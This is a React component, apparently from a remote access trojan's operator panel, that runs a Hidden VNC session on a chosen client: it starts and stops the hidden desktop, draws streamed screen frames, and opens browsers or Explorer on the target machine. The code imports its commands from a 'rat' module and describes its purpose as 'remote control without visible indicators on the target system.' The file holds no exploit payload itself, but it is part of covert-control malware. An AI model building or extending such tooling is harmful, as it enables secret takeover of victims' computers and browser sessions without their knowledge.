import { useEffect, useState, useRef } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import { manageHVNC } from "../rat/RATCommands";
import {
  IconAdjustmentsAlt,
  IconInfoCircle,
  IconX,
  IconDeviceDesktopPlus,
} from "@tabler/icons-react";

export const HVNC = () => {
  const { addr } = useParams();
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const lastFrameRef = useRef<HTMLImageElement | null>(null);

  // UI state
  const [showControls, setShowControls] = useState(true);
  const [showTooltip, setShowTooltip] = useState<string | null>(null);
  const [connectionStatus, setConnectionStatus] =
    useState<string>("Ready to connect");

  // HVNC state
  const [isConnected, setIsConnected] = useState<boolean>(false);
  const [loading, setLoading] = useState<boolean>(false);
  const [selectedAction, setSelectedAction] = useState<string>("explorer.exe");
  const [showInfoMessage, setShowInfoMessage] = useState(true);

  useEffect(() => {
    lastFrameRef.current = new Image();

    // Listen for HVNC frames from the backend
    const unlisten = listen("hvnc_frame", (event: any) => {
      if (!isConnected) return;
      const payload = event.payload;

      // Only process frames for the current client
      if (payload.addr === addr) {
        if (canvasRef.current && lastFrameRef.current) {
          const ctx = canvasRef.current.getContext("2d");
          if (ctx) {
            lastFrameRef.current.src = `data:image/jpeg;base64,${payload.data}`;

            lastFrameRef.current.onload = () => {
              if (ctx && canvasRef.current && lastFrameRef.current) {
                canvasRef.current.width = lastFrameRef.current.width;
                canvasRef.current.height = lastFrameRef.current.height;

                ctx.drawImage(
                  lastFrameRef.current,
                  0,
                  0,
                  lastFrameRef.current.width,
                  lastFrameRef.current.height
                );
              }
            };
          }
        }

        setConnectionStatus("Connected");
        setIsConnected(true);
        setLoading(false);
      }
    });

    return () => {
      // Cleanup listener when component unmounts
      unlisten.then((unlistenFn) => unlistenFn());

      // Stop HVNC when navigating away
      if (isConnected && addr) {
        stopHVNC();
      }
    };
  }, [addr, isConnected]);

  const startHVNC = async () => {
    if (!addr) return;

    setLoading(true);
    setConnectionStatus("Connecting...");

    try {
      await manageHVNC(addr, "start");
      setIsConnected(true);
    } catch (error) {
      console.error("Failed to start HVNC:", error);
      setLoading(false);
      setConnectionStatus("Connection failed");
    }

    // Set a timeout to reset loading state if no frames arrive
    setTimeout(() => {
      if (loading) {
        setLoading(false);
        setConnectionStatus("Connection timed out");
      }
    }, 10000);
  };

  const performAction = async () => {
    if (!addr || !isConnected) return;

    try {
      if (selectedAction === "explorer.exe") {
        await manageHVNC(addr, "open_explorer");
      } else if (selectedAction === "chrome.exe") {
        await manageHVNC(addr, "open_chrome");
      } else if (selectedAction === "firefox.exe") {
        await manageHVNC(addr, "open_firefox");
      } else if (selectedAction === "edge.exe") {
        await manageHVNC(addr, "open_edge");
      }
    } catch (error) {
      console.error(`Failed to open ${selectedAction}:`, error);
    }
  };

  const stopHVNC = async () => {
    if (!addr) return;

    try {
      await manageHVNC(addr, "stop");
      setIsConnected(false);
      setConnectionStatus("Ready to connect");
    } catch (error) {
      console.error("Failed to stop HVNC:", error);
    }
  };

  // UI helper functions
  const showToolTip = (tip: string) => {
    setShowTooltip(tip);
  };

  const hideTooltip = () => {
    setShowTooltip(null);
  };

  const toggleControls = () => {
    setShowControls(!showControls);
  };

  if (!addr) {
    return (
      <div className="p-6 flex flex-col items-center justify-center h-full">
        <h1 className="text-2xl font-bold mb-4">HVNC</h1>
        <p>No client selected. Please select a client from the clients list.</p>
      </div>
    );
  }

  return (
    <div className="relative w-screen h-screen bg-black flex flex-col items-center p-0 m-0">
      {/* Side controls */}
      <div className="fixed top-4 left-4 z-10 flex flex-col gap-3">
        <button
          className={`p-3 rounded-xl shadow-lg backdrop-blur-md transition-all duration-200 cursor-pointer ${
            !showControls
              ? "bg-secondarybg bg-opacity-80"
              : "bg-white bg-opacity-90"
          }`}
          onClick={toggleControls}
          onMouseEnter={() =>
            showToolTip(showControls ? "Hide Controls" : "Show Controls")
          }
          onMouseLeave={hideTooltip}
        >
          <IconAdjustmentsAlt
            size={24}
            className="transition-transform duration-300"
            style={{ transform: showControls ? "rotate(180deg)" : "rotate(0)" }}
            color={!showControls ? "white" : "black"}
          />
        </button>
      </div>

      {/* Tooltip */}
      {showTooltip && (
        <div className="fixed top-4 left-20 z-20 bg-black bg-opacity-90 text-white px-3 py-2 rounded-lg text-sm shadow-lg">
          {showTooltip}
        </div>
      )}

      {/* Main controls */}
      {showControls && (
        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-10 bg-primarybg bg-opacity-90 backdrop-blur-md p-4 rounded-xl shadow-xl text-white max-w-lg w-full">
          <div className="flex w-full justify-between items-center mb-3">
            <div className="flex items-center gap-2">
              <IconDeviceDesktopPlus size={20} className="text-accentx" />
              <h3 className="text-base font-medium">Hidden VNC</h3>
            </div>

            <div className="flex items-center gap-2">
              <span
                className={`text-xs px-3 py-1 rounded-md font-medium ${
                  connectionStatus === "Connected"
                    ? "bg-green-500 text-white"
                    : connectionStatus === "Connecting..."
                    ? "bg-yellow-500 text-black"
                    : connectionStatus === "Connection failed" ||
                      connectionStatus === "Connection timed out"
                    ? "bg-red-500 text-white"
                    : "bg-gray-700 text-white"
                }`}
              >
                {connectionStatus}
              </span>
            </div>
          </div>

          <div className="grid grid-cols-1 gap-4 w-full">
            <div className="bg-secondarybg bg-opacity-70 rounded-lg flex items-center px-3 py-2 border border-gray-700">
              <label className="text-sm text-accentx mr-2">Action:</label>
              <select
                className={`block w-full text-sm bg-transparent focus:outline-none ${
                  !isConnected
                    ? "text-gray-500 cursor-not-allowed"
                    : "text-white"
                }`}
                value={selectedAction}
                onChange={(e) => setSelectedAction(e.target.value)}
                disabled={!isConnected}
              >
                <option value="explorer.exe">Explorer</option>
                <option value="chrome.exe">Chrome</option>
                <option value="firefox.exe">Firefox</option>
                <option value="edge.exe">Microsoft Edge</option>
              </select>
            </div>

            <div className="flex gap-3">
              {!isConnected ? (
                <button
                  className="text-sm w-full py-2 rounded-lg border transition-all duration-200 flex items-center justify-center font-medium cursor-pointer border-green-500 bg-green-500 bg-opacity-40 text-white hover:bg-opacity-60"
                  onClick={startHVNC}
                  disabled={loading}
                >
                  {loading ? "Connecting..." : "Start HVNC"}
                </button>
              ) : (
                <button
                  className="text-sm w-full py-2 rounded-lg border transition-all duration-200 flex items-center justify-center font-medium cursor-pointer border-red-500 bg-red-500 bg-opacity-40 text-white hover:bg-opacity-60"
                  onClick={stopHVNC}
                >
                  Stop HVNC
                </button>
              )}

              <button
                className={`text-sm w-full py-2 rounded-lg border transition-all duration-200 flex items-center justify-center font-medium cursor-pointer ${
                  !isConnected
                    ? "border-gray-500 bg-gray-500 bg-opacity-20 text-gray-400 cursor-not-allowed"
                    : "border-blue-500 bg-blue-500 bg-opacity-40 text-white hover:bg-opacity-60"
                }`}
                onClick={performAction}
                disabled={!isConnected}
              >
                Run Action
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="flex-1 flex items-center justify-center w-full h-full">
        {loading ? (
          <div className="flex flex-col items-center justify-center text-center p-8 text-white">
            <svg
              className="animate-spin h-12 w-12 text-white mb-4"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
            >
              <circle
                className="opacity-25"
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                strokeWidth="4"
              ></circle>
              <path
                className="opacity-75"
                fill="currentColor"
                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
              ></path>
            </svg>
            <p>Starting HVNC session...</p>
          </div>
        ) : (
          <canvas
            ref={canvasRef}
            className="max-h-full max-w-full"
            tabIndex={0}
          />
        )}
      </div>

      {!isConnected && !loading && showInfoMessage && (
        <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 z-10 bg-primarybg bg-opacity-90 backdrop-blur-md px-4 py-3 rounded-xl shadow-xl text-white max-w-lg flex items-center gap-2">
          <IconInfoCircle size={18} className="text-accentx shrink-0" />
          <p className="text-sm">
            Hidden VNC allows remote control without visible indicators on the
            target system.
          </p>
          <button
            className="ml-2 text-gray-400 hover:text-white cursor-pointer"
            onClick={() => setShowInfoMessage(false)}
          >
            <IconX size={18} />
          </button>
        </div>
      )}
    </div>
  );
};
